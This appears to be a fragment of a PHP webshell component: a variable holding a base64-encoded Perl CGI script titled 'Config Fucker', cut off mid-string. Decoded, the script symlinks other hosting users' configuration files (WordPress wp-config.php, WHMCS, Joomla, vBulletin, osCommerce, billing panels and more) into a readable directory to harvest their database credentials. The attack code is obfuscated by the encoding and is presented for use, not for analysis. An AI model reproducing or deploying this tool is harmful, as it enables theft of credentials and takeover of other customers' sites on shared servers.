$configshell = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Db25maWcgRnVja2VyIEJ5IFgtMW43M2N0PC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3BuZy0zLmZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMTkzNS9yZWRfZ2Vtc192b2xfMi8xMjgvcjJfZHJhZ29uLnBuZyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoNCn0NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogZm9udC1zaXplOiB4LXNtYWxsOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KIGNvbG9yOiAjMDBmZjAwOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQokZG9tYWluPSRtc3IuIi8iLiR1c2VyOw0KJGRvbWFpbj1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0udHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+aG9wLVpDc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0udHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLWZvcnVtLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywkZG9tYWluLid+fj5CYWxpdGJhbmcudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmcudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy50eHQnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkZG9tYWluLid+fj5waHBiYjMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3MudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htYy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy50eHQnKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2UudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvb